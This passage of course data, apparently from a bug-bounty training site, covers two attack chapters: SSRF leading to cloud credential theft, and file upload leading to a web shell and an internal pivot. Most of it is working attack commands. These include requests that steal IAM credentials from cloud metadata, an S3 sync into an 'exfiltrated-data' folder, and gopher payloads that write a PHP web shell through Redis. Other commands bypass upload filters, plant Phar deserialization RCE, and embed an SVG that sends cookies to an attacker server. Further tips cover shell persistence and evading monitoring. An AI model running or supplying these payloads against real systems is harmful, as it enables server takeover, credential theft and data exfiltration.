            cmd: "ffuf -u 'https://target.com/fetch?url=FUZZ' -w ssrf-payloads.txt -o ssrf-results.json -fc 400,404",
            desc: "Fuzz SSRF parameters with a wordlist of internal URLs and collaborator URLs — find blind SSRF callbacks",
          },
          {
            cmd: "curl -s 'https://target.com/convert?url=http://127.0.0.1:3306' --connect-timeout 5 -o /dev/null -w '%{http_code}'",
            desc: "Port scan via SSRF — check if internal MySQL port (3306) is accessible by observing timing/response differences",
          },
          {
            cmd: "cat ssrf-results.json | jq -r '.results[] | select(.status == 200) | .input.FUZZ' > confirmed-ssrf.txt",
            desc: "Extract confirmed SSRF payloads that returned 200 — these are endpoints that fetch external URLs successfully",
          },
          {
            cmd: "curl 'https://target.com/api/image?url=http://burpcollaborator.net/test' --proxy http://127.0.0.1:8080",
            desc: "Route SSRF test through Burp proxy to inspect the request/response in detail for confirmation",
          },
        ],
        tips: [
          "Gopher protocol payloads can turn a limited SSRF into full internal service access — gopher://redis:6379/",
          "Always use your own collaborator domain (Interactsh, Burp Collaborator) — free ones may be rate-limited",
          "The metadata service IP 169.254.169.254 works on AWS, GCP, and Azure — each cloud provider returns different data",
          "DNS-based SSRF detection: if the server resolves your domain's DNS, you have an SSRF — even without HTTP callback",
        ],
      },
      {
        title: "Cloud Metadata Service Exploitation",
        text: "Every major cloud provider exposes instance metadata at 169.254.169.254. When SSRF is present, you can read this metadata to get IAM credentials, instance tags, user-data scripts, and cloud provider-specific secrets. AWS IMDSv1 is trivially exploitable; IMDSv2 requires additional headers but is still bypassable.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            desc: "AWS SSRF: list all IAM roles attached to the instance — each role name maps to a set of credentials",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'",
            desc: "Extract IAM credentials for a specific role — returns AccessKeyId, SecretAccessKey, and Token",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/user-data'",
            desc: "Retrieve instance user-data — often contains startup scripts with hardcoded secrets, API keys, and passwords",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'",
            desc: "Azure SSRF: retrieve instance metadata with the required Metadata header — returns full config",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'",
            desc: "GCP SSRF: retrieve metadata with the Metadata-Flavor header — access service account tokens and project info",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
            desc: "GCP SSRF: extract the default service account's access token — use with gcloud CLI to access cloud resources",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/'",
            desc: "List MAC addresses and associated VPC/subnet info — helps map the internal network topology",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/public-keys/'",
            desc: "Retrieve public SSH keys from metadata — if you find them, you might be able to SSH into the instance",
          },
        ],
        tips: [
          "IMDSv2 requires a PUT request to get a token first: curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
          "Some SSRF filters block 169.254.169.254 — use alternate representations: 0x7f000001, 2130706433, or DNS rebinding",
          "DNS rebinding: register a domain that alternates between your server and 169.254.169.254 to bypass hostname checks",
          "Document every credential you find — programs need to know the full scope of the exposure for their cloud security team",
        ],
      },
      {
        title: "Credential Reuse & Cloud Pivoting",
        text: "Stolen cloud credentials are the final prize. Use them to access S3 buckets, download database backups, or pivot to other cloud services. The AWS CLI lets you assume roles, list resources, and export data. This section covers validating stolen credentials and demonstrating cloud-wide impact.",
        commands: [
          {
            cmd: "export AWS_ACCESS_KEY_ID=STOLEN_KEY && export AWS_SECRET_ACCESS_KEY=STOLEN_SECRET && export AWS_SESSION_TOKEN=STOLEN_TOKEN && aws sts get-caller-identity",
            desc: "Validate stolen AWS credentials — confirms the role, account ID, and that the keys are active",
          },
          {
            cmd: "aws s3 ls --region us-east-1 2>&1 | head -20",
            desc: "List all S3 buckets accessible with the stolen credentials — may include internal data stores",
          },
          {
            cmd: "aws s3 sync s3://internal-bucket-name/ ./exfiltrated-data/ --no-sign-request --region us-east-1 2>&1",
            desc: "Download an S3 bucket's contents — add --no-sign-request if the bucket is public for faster access",
          },
          {
            cmd: "aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].[InstanceId,State.Name,Tags[?Key==`Name`].Value[]]' --output table",
            desc: "List all EC2 instances in the account — demonstrates the scope of cloud access from the stolen creds",
          },
          {
            cmd: "aws rds describe-db-instances --region us-east-1 --query 'DBInstances[].[DBInstanceIdentifier,DBInstanceStatus,Endpoint.Address]' --output table",
            desc: "List RDS databases — if you find a publicly accessible database, the impact escalates to data breach",
          },
          {
            cmd: "gcloud auth activate-service-account --key-file=stolen-key.json && gcloud projects list",
            desc: "Authenticate with stolen GCP service account key and list all accessible projects",
          },
          {
            cmd: "gcloud storage ls --recursive gs://internal-bucket/",
            desc: "List all objects in a GCP storage bucket using the stolen service account's credentials",
          },
          {
            cmd: "az login --identity -u STOLEN_CLIENT_ID && az vm list --output table",
            desc: "Authenticate with stolen Azure managed identity and list all VMs in the subscription",
          },
        ],
        tips: [
          "Never use stolen credentials on your own AWS account — use a sandbox or isolated environment for validation",
          "The AWS Security Token Service (STS) expires after 1-6 hours — move fast when you have live credentials",
          "Cloud shell environments (AWS CloudShell, gcloud cloud-shell) give you a browser terminal pre-authenticated",
          "Program scope often excludes cloud resource access — confirm with the program before demonstrating cloud pivoting",
        ],
      },
      {
        title: "Gopher Protocol — SSRF to RCE via Redis",
        text: "Gopher is the most powerful SSRF protocol. When a server's URL parser supports the gopher:// scheme, you can send arbitrary TCP data to any internal service. Chain SSRF with internal Redis (default port 6379, no auth) to write an SSH key, create a cron job, or inject a web shell — turning a blind SSRF into full Remote Code Execution.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/fetch?url=gopher://127.0.0.1:6379/_PING'",
            desc: "Test gopher protocol support: if the server doesn't error, gopher is enabled — PING checks if Redis is reachable",
          },
          {
            cmd: "python3 -c \"\n# Gopher payload: write SSH key to Redis for RCE\npayload = b'*3\\r\\n\\$3\\r\\nSET\\r\\n\\$4\\r\\ncrond\\r\\n\\$68\\r\\n*/1 * * * * root echo \\\"\\$(cat /root/.ssh/authorized_keys)\\\" > /root/.ssh/authorized_keys\\r\\n'\nimport urllib.parse\nprint('gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload.decode()))\n\"",
            desc: "Generate gopher payload: Redis SET command that writes a cron job to overwrite SSH authorized_keys",
          },
          {
            cmd: 'cat << \'EOF\' > gopher-redis.py\n#!/usr/bin/env python3\nimport urllib.parse, sys\n\ndef redis_cmd(*args):\n    parts = [f"*{len(args)}\\r\\n"]\n    for a in args:\n        parts.append(f"${len(a.encode())}\\r\\n{a}\\r\\n")\n    return "".join(parts)\n\n# Payload: write PHP web shell to webroot via Redis CONFIG SET\ncmds = [\n    redis_cmd("CONFIG", "SET", "dir", "/var/www/html"),\n    redis_cmd("CONFIG", "SET", "dbfilename", "shell.php"),\n    redis_cmd("SET", "payload", "<?php system($_GET[\'cmd\']); ?>"),\n    redis_cmd("BGSAVE"),\n]\nfull = "".join(cmds)\nencoded = urllib.parse.quote(full, safe="")\nprint(f"gopher://127.0.0.1:6379/_{encoded}")\nEOF\npython3 gopher-redis.py',
            desc: "Generate Redis gopher payload that writes a PHP web shell via CONFIG SET + BGSAVE — full RCE in one URL",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=gopher://127.0.0.1:6379/_INFO' | grep -i 'redis_version\\|os\\|uptime'",
            desc: "Extract Redis server info via gopher: version, OS, uptime — confirms connectivity and helps tailor the exploit",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=gopher://127.0.0.1:3306/_'",
            desc: "Test gopher to MySQL port: if no error, internal MySQL is reachable and potentially exploitable via gopher",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://127.0.0.1:6379/' -o /dev/null -w '%{http_code}'",
            desc: "Alternative test: HTTP request to Redis port — if it returns a 400+ error (not connection refused), Redis is open",
          },
          {
            cmd: "for port in 6379 6380 11211 27017 9200 5432 3306; do code=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 3 'https://target.com/fetch?url=http://127.0.0.1:'$port); echo \"Port $port: $code\"; done",
            desc: "Internal port scan via SSRF: probe common database/cache ports — non-zero response means the port is open",
          },
        ],
        tips: [
          "Gopher encoding requires double URL-encoding of special characters (%0d%0a for CRLF) — use a Python script to generate payloads",
          "Redis on default config has no authentication — if you find port 6379 open via SSRF, you almost certainly have RCE",
          "Not all URL parsers support gopher:// — test with a simple PING first before building complex payloads",
          "Some targets block gopher but allow dict:// — dict://127.0.0.1:6379/CONFIG SET works as an alternative protocol",
        ],
      },
      {
        title: "PDF Generator SSRF — wkhtmltopdf & Puppeteer",
        text: "Every 'Export to PDF' feature is a potential SSRF. Tools like wkhtmltopdf, Puppeteer, and Chromium render HTML server-side — meaning your injected <img>, <iframe>, or <link> tags trigger server-side requests from the renderer's IP. This SSRF often accesses internal services that the main web server can't reach, and can leak data via PDF output.",
        commands: [
          {
            cmd: "'\"><img src=\"http://169.254.169.254/latest/meta-data/\" width=\"1000\" height=\"1000\">",
            desc: "PDF SSRF via <img>: if the PDF renderer loads the image server-side, cloud metadata appears in the generated PDF",
          },
          {
            cmd: "'\"><iframe src=\"http://127.0.0.1:8080/admin\" width=\"100%\" height=\"500px\"></iframe>",
            desc: "PDF SSRF via <iframe>: internal admin panel renders inside the PDF — output contains the panel's content",
          },
          {
            cmd: "'\"><link rel=\"stylesheet\" href=\"http://YOUR-COLLABORATOR.oastify.com/exfil\">",
            desc: "PDF SSRF via <link>: CSS file request to your collaborator confirms the renderer is making server-side requests",
          },
          {
            cmd: "curl -s 'https://target.com/export-pdf?url=http://YOUR-SERVER/payload.html' -o output.pdf",
            desc: "Provide your own HTML to the PDF generator — full control over what the renderer loads and renders",
          },
          {
            cmd: "cat output.pdf | strings | grep -i 'secret\\|password\\|flag\\|admin\\|internal\\|cloud' | head -20",
            desc: "Extract strings from generated PDF — look for leaked internal service content that rendered in the PDF",
          },
          {
            cmd: "'\"><script>document.body.innerHTML='<img src=http://169.254.169.254/latest/meta-data/iam/security-credentials/></script>",
            desc: "PDF with JavaScript: if the renderer executes JS, redirect the page to load metadata — JS-enabled SSRF is more powerful",
          },
          {
            cmd: "'\"><meta http-equiv=\"refresh\" content=\"0;url=http://127.0.0.1:3000/\">",
            desc: "HTML meta refresh redirect: the renderer follows the redirect and renders the internal page in the PDF output",
          },
          {
            cmd: "echo 'https://target.com/export-pdf?url=http://127.0.0.1:5000/secret' > pdf-ssrf-candidates.txt",
            desc: "If the PDF generator accepts a URL parameter, try loading internal services directly — the PDF becomes your viewer",
          },
        ],
        tips: [
          "wkhtmltopdf and Chromium render <img> and <iframe> server-side — CSS url() also triggers requests",
          "Some PDF generators disable JavaScript but allow <img> and <link> — test both JS-enabled and JS-disabled vectors",
          "The PDF renderer's network may differ from the web server's — it might have access to internal Kubernetes services",
          "Check the generated PDF's metadata for server IP and environment info: exiftool output.pdf",
        ],
      },
    ],
    tools: [
      {
        name: "interactsh",
        desc: "Collaborator-based OOB detection for blind SSRF — essential for finding SSRF without response reflection",
        install: "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
        link: "https://github.com/projectdiscovery/interactsh",
      },
      {
        name: "ffuf",
        desc: "Endpoint fuzzer for blind SSRF payload injection across multiple parameters",
        install: "go install github.com/ffuf/ffuf/v2@latest",
        link: "https://github.com/ffuf/ffuf",
      },
      {
        name: "aws-cli",
        desc: "AWS Command Line Interface — used to validate stolen credentials and explore cloud resources",
        install: "apt install awscli",
        link: "https://aws.amazon.com/cli/",
      },
      {
        name: "gcloud",
        desc: "Google Cloud CLI — authenticate with stolen service account keys and browse GCP resources",
        install: "Can be downloaded from https://cloud.google.com/sdk/docs/install",
        link: "https://cloud.google.com/sdk",
      },
    ],
    summary:
      "You now understand the SSRF-to-cloud-compromise chain: discovering SSRF endpoints, exploiting cloud metadata services across AWS/GCP/Azure, and pivoting with stolen credentials to access S3 buckets, databases, and compute resources. SSRF chains consistently receive Critical severity ratings.",
  },
  {
    id: "upload-to-rce",
    number: 4,
    title: "File Upload → Web Shell → Internal Pivot",
    subtitle: "Turn a file upload form into full server access",
    color: "oklch(0.7 0.14 65)",
    overview:
      "File upload vulnerabilities are everywhere — profile pictures, document attachments, CSV imports, and theme uploads. A single unvalidated upload can give you a web shell, and a web shell is one command away from internal network access. This chapter covers bypassing upload filters, deploying web shells, and using the shell to pivot internally.",
    sections: [
      {
        title: "Bypassing Upload Filters",
        text: "Modern applications validate uploads by extension, MIME type, magic bytes, or content inspection. Each filter has bypasses. The key is understanding which validation is in place and choosing the right bypass technique. Combine multiple bypasses for defense-in-depth filters.",
        commands: [
          {
            cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && file shell.php",
            desc: "Create a minimal PHP web shell and verify its file type — the first step in any upload attack",
          },
          {
            cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php5 && file shell.php5",
            desc: "PHP shell with .php5 extension — bypasses filters that only block .php but allow .php4/.php5/.phtml",
          },
          {
            cmd: "echo 'GIF89a<?php system($_GET[\"cmd\"]); ?>' > shell.gif.php && file shell.gif.php",
            desc: "Double extension with GIF header — file reads as GIF89a (valid image header), server executes as PHP",
          },
          {
            cmd: "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg && mv image.jpg image.php.jpg",
            desc: "Embed PHP code in JPEG metadata — the image remains valid while containing executable PHP in EXIF data",
          },
          {
            cmd: '#!/bin/bash\nfor ext in php php3 php4 php5 pht phtml pgif shtml inc; do\n  echo "<?php system(\$_GET[\'cmd\']); ?>" > "shell.$ext"\ndone\nls -la shell.*',
            desc: "Generate a shell with every possible PHP extension — try them all to find which one bypasses the filter",
          },
          {
            cmd: "curl -s -F 'file=@shell.php;filename=shell.php%00.jpg' -F 'submit=Upload' 'https://target.com/upload'",
            desc: "Null-byte injection in filename — older PHP versions truncate at %00, dropping .jpg and keeping .php",
          },
          {
            cmd: "curl -s -F 'file=@shell.php;filename=shell.php' -F 'filetype=image/jpeg' 'https://target.com/upload' -v",
            desc: "MIME type override — send shell.php with a forged image/jpeg content type to bypass MIME-only checks",
          },
          {
            cmd: "zip --encrypt shell.zip shell.php && curl -F 'file=@shell.zip' 'https://target.com/upload'",
            desc: "Archive upload — some apps extract zip files without scanning contents, deploying your shell",
          },
        ],
        tips: [
          "Check if the server supports .htaccess overrides — upload a .htaccess that adds PHP execution to image extensions",
          "Race condition upload: send the PHP file and request it simultaneously before the filter deletes it",
          "Some apps only validate content-type header, not actual content — send shell.php with Content-Type: image/png",
          "Upload to a path you can access — if the file goes to /uploads/ but you don't know the filename pattern, ask support",
        ],
      },
      {
        title: "Web Shell Deployment & Persistence",
        text: "Once you've uploaded a shell, you need to find it and verify execution. Common upload paths are /uploads/, /files/, /media/, or /storage/. If the filename is randomized, check response headers for the file URL, or use directory brute-forcing. After verification, establish persistence to survive deletion.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=id'",
            desc: "Verify the web shell is accessible and executes commands — 'id' should return the server's user context",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=ls+-la+/etc/passwd'",
            desc: "Check if you can read system files — accessing /etc/passwd confirms command execution with readable permissions",
          },
          {
            cmd: "ffuf -u 'https://target.com/uploads/FUZZ' -w shell-names.txt -fc 403,404 -o shell-location.json",
            desc: "Brute-force the upload directory to find your shell if the filename was randomized by the server",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=cat+/etc/crontab'",
            desc: "Read the system crontab — look for cron jobs running as root that you can hijack for persistence",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=echo+\\\"Content-Disposition:+attachment%3B+filename%3Dshell.php\\\"+%3E+/var/www/uploads/.htaccess'",
            desc: "Deploy a .htaccess via the shell to force PHP execution in the uploads directory — survives shell deletion",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=php+-r+\\\"file_put_contents(\\'backdoor.php\\',+base64_decode(\\'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+\\'));\\\"'",
            desc: "Deploy a backup shell from your current shell — if the original is deleted, the backup persists",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=cat+/proc/1/environ' | tr '\\0' '\\n'",
            desc: "Read process environment variables — often contains database credentials, API keys, and secrets",
          },
        ],
        tips: [
          "Change the shell password/parameter immediately — other hunters or scanners may find and use your shell",
          "Use obfuscated shells (base64 encoded, AES encrypted) to avoid detection by monitoring tools",
          "Set up a cron job via the shell that re-downloads your shell every minute if it's deleted",
          "Check if you can write outside webroot — a shell outside the webroot directory persists even if uploads are cleaned",
        ],
      },
      {
        title: "Internal Network Pivoting",
        text: "A web shell is the door to the internal network. From the compromised server, you can scan internal IP ranges, access databases, reach internal services, and use the server as a SOCKS proxy. The most valuable pivots lead to internal admin panels, CI/CD servers, and databases with sensitive data.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=ip+addr+show' | grep -oP 'inet \\K[\\d.]+'",
            desc: "Get the server's internal IP address — tells you which subnet you're on for internal scanning",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=cat+/etc/hosts'",
            desc: "Read /etc/hosts for internal hostname mappings — often reveals databases, caches, and internal apps",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=arp+-a'",
            desc: "View the ARP table to discover other hosts on the same subnet — network neighborhood from the shell",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=for+i+in+%241..254%3B+do+ping+-c+1+-W+1+10.0.0.%24i+%26%3B+done'",
            desc: "Parallel ping sweep of 10.0.0.0/24 subnet via shell — discovers live internal hosts quickly",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=nc+-zv+10.0.0.1+3306+2%3E%261+||+echo+closed'",
            desc: "Check if MySQL port (3306) is open on an internal host — databases are high-value internal targets",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=curl+http://internal-admin.local/dashboard'",
            desc: "Use the compromised server to curl internal services — reach internal-only admin panels",
          },
          {
            cmd: '#!/bin/bash\n# pivotshell.sh — proxy through the web shell\n# Replace URL with your shell endpoint\nSHELL_URL="https://target.com/uploads/shell.php"\nTARGET_URL=$(echo "$1" | base64 | tr -d "\\n")\ncurl -s "$SHELL_URL?cmd=curl+-s+%24(echo+$TARGET_URL+|+base64+-d)"\necho ""',
            desc: "Pivot proxy script: pass any URL through your shell — makes internal requests via the compromised server",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/shell.php?cmd=mysql+-h+10.0.0.5+-u+root+-p\\\"\\\"+information_schema+-e+\\\"show+tables\\\"'",
            desc: "Direct MySQL query via shell — if internal MySQL has no password or leaked creds, you can dump the database",
          },
        ],
        tips: [
          "Use the shell to download and run a static nmap binary for comprehensive internal scanning",
          "Internal services often have no authentication — the default creds work because they're 'not exposed to the internet'",
          "Check /home directories for SSH keys — if found, you can SSH to other internal servers without a password",
          "Internal CI/CD servers (Jenkins, GitLab) are the ultimate pivot target — they have access to production infrastructure",
        ],
      },
      {
        title: "Phar Deserialization — RCE Without Executable Code",
        text: "PHP's phar:// wrapper triggers deserialization when accessing a Phar archive's metadata — even through file functions like file_exists(), is_dir(), or file_get_contents(). Upload a crafted .phar file (disguised as .jpg, .pdf, or .zip), then trigger the deserialization via any path that passes your filename to a PHP function. No code execution needed — the deserialization chain does all the work.",
        commands: [
          {
            cmd: 'cat << \'EOF\' > phar-payload.php\n<?php\n// Generate a Phar file with malicious serialized metadata\nclass RCE {\n    public $cmd = "id > /tmp/pwned";\n    public function __destruct() {\n        system($this->cmd);\n    }\n}\n$phar = new Phar("exploit.phar");\n$phar->startBuffering();\n$phar->addFromString("test.txt", "test");\n$phar->setMetadata(new RCE());\n$phar->stopBuffering();\nrename("exploit.phar", "exploit.jpg");\necho "Phar payload created as exploit.jpg";\nEOF\nphp phar-payload.php',
            desc: "Generate a Phar archive with a serialized RCE object in metadata — renamed to .jpg to bypass extension filters",
          },
          {
            cmd: "curl -s -F 'file=@exploit.jpg;filename=avatar.jpg' 'https://target.com/upload'",
            desc: "Upload the crafted Phar disguised as a JPG — the server stores it thinking it's an image file",
          },
          {
            cmd: "curl -s 'https://target.com/profile/avatar/avatar.jpg' -o /dev/null -w '%{http_code}'",
            desc: "Confirm the upload was stored and accessible — verify the file path for the next step (trigger deserialization)",
          },
          {
            cmd: "curl -s 'https://target.com/upload?file=phar:///var/www/uploads/avatar.jpg/test.txt'",
            desc: "Trigger phar deserialization via a URL parameter that gets passed to file_exists(), is_dir(), or similar PHP function",
          },
          {
            cmd: "curl -s 'https://target.com/api/user/update' -H 'Content-Type: application/json' -d '{\"avatar\":\"phar://uploads/avatar.jpg\"}'",
            desc: "Inject phar:// path via API — if the server calls file_exists() on the avatar path, deserialization triggers",
          },
          {
            cmd: "cat live-urls.txt | grep -iE 'file=|path=|load=|read=|download=|include=' > phar-candidates.txt",
            desc: "Find parameters that might be passed to PHP file functions — phar:// deserialization triggers on common file operations",
          },
          {
            cmd: "python3 -c \"\n# Test if phar deserialization is possible\n# Send a request that triggers file_exists on a non-existent .phar\n# A 500 error + PHP warning in response suggests phar:// is viable\nimport requests\nr = requests.get('https://target.com/', params={'file': 'phar://test.phar'})\nprint('Status:', r.status_code)\nprint('phar error' in r.text.lower() and 'VULNERABLE' or 'NOT VULN')\n\"",
            desc: "Quick phar vulnerability test: if phar:// in a parameter triggers a PHP error, deserialization is likely possible",
          },
        ],
        tips: [
          "Phar deserialization works on PHP 5.3+ and affects all PHP file functions — file_exists, is_file, is_dir, include, fopen",
          "The .phar file must be accessible via a path the server can read — uploaded files in webroot are perfect targets",
          "Use a gadget chain (PHPGGC) instead of a custom class if you can't control the autoloading on the target",
          "Phar files can have any extension — .jpg, .png, .gif, .pdf all work as long as the phar:// wrapper processes them",
        ],
      },
      {
        title: "SVG Injection — XSS, SSRF, and RCE in One File",
        text: "SVG files are XML with embedded HTML/JavaScript. A single SVG can carry XSS payloads (script tags inside SVG), SSRF probes (via <image> or <foreignObject> loading external URLs), and RCE vectors (XML external entities or SSI). Upload one SVG and test every vulnerability class at once — the file format naturally supports all of them.",
        commands: [
          {
            cmd: 'cat << \'EOF\' > exploit.svg\n<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n  <text x="20" y="35">&xxe;</text>\n  <script>fetch("https://YOUR-SERVER/?c="+document.cookie)</script>\n  <image href="http://169.254.169.254/latest/meta-data/" width="100%" height="100%"/>\n</svg>\nEOF',
            desc: "Triple-threat SVG: XXE (read /etc/passwd), XSS (cookie exfil), and SSRF (cloud metadata probe) in one upload",
          },
          {
            cmd: "curl -s -F 'file=@exploit.svg;filename=icon.svg' 'https://target.com/upload'",
            desc: "Upload the SVG payload — many apps accept SVG uploads for avatars, icons, or rich text content",
          },
          {
            cmd: "curl -s 'https://target.com/uploads/icon.svg' -o downloaded.svg && cat downloaded.svg",
            desc: "Download the uploaded SVG to check if the server sanitized it — if the payload is intact, all vectors are live",
          },
          {
            cmd: 'cat << \'EOF\' > polyglot.svg\n<svg xmlns="http://www.w3.org/2000/svg">\n  <use href="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/>\n</svg>\nEOF',
            desc: "Data URI polyglot SVG: JavaScript is base64-encoded inside a data: URI — bypasses regex-based XSS filters",
          },
          {
            cmd: "curl -s -F 'file=@polyglot.svg;filename=photo.svg' 'https://target.com/upload' && curl -s 'https://target.com/uploads/photo.svg' | grep -i 'script\\|alert'",
            desc: "Upload and verify the polyglot SVG survived — check if the <script> tag is still present in the rendered file",
          },
          {
            cmd: 'cat << \'EOF\' > ssrf-svg.svg\n<svg xmlns="http://www.w3.org/2000/svg">\n  <image href="http://127.0.0.1:8080/admin" width="1000" height="1000"/>\n  <foreignObject width="100%" height="100%">\n    <iframe src="http://10.0.0.1/secret"></iframe>\n  </foreignObject>\n</svg>\nEOF',
            desc: "SSRF-focused SVG: <image> loads an internal admin panel, <foreignObject> with iframe loads another internal service",
          },
          {
            cmd: "cat upload-endpoints.txt | while read url; do curl -s -F 'file=@exploit.svg' \"$url\" | grep -i 'svg\\|uploaded\\|error' ; done",
            desc: "Batch upload the SVG to every discovered upload endpoint — one file tests every endpoint for SVG vulnerabilities",
          },
        ],
        tips: [
          "Many apps only check file extension — rename .svg to .png or .gif; the server may still process it as SVG internally",
          "If scripts are stripped, check if <use>, <animate>, or <set> elements survive — they can execute via XSLT transforms",
          "SVG XXE bypasses most WAFs because it's valid XML embedded in an expected image format",
          "Some SVG renderers support XSLT — add <?xml-stylesheet type=\"text/xsl\" href=\"http://YOUR-SERVER/transform.xsl\"?> for RCE",
        ],
      },
    ],
    tools: [
      {
        name: "exiftool",
        desc: "Read/write EXIF metadata in images — embed PHP code in JPEG headers for filter bypass",
        install: "apt install exiftool",
        link: "https://exiftool.org/",
      },
      {
        name: "curl",
        desc: "All-purpose HTTP client for uploading, shell access, and internal network requests",
        install: "apt install curl",
        link: "https://curl.se/",
      },
      {
        name: "netcat",
        desc: "Port scanning and banner grabbing from the web shell for internal network discovery",
        install: "apt install netcat-openbsd",
        link: "https://nc110.sourceforge.io/",
      },
      {
        name: "nmap (static)",
        desc: "Static nmap binary for comprehensive internal scanning — upload and run from the web shell",
        install: "Download from https://nmap.org/download.html#linux-static",
        link: "https://nmap.org/",
      },
    ],
    summary:
      "You now own the full file-upload-to-RCE chain: bypassing upload filters with extension tricks and metadata injection, deploying and persisting web shells, and using the shell to pivot to internal networks. File upload flaws are consistently top-rated in bug bounty programs due to the server compromise potential.",
  },
]
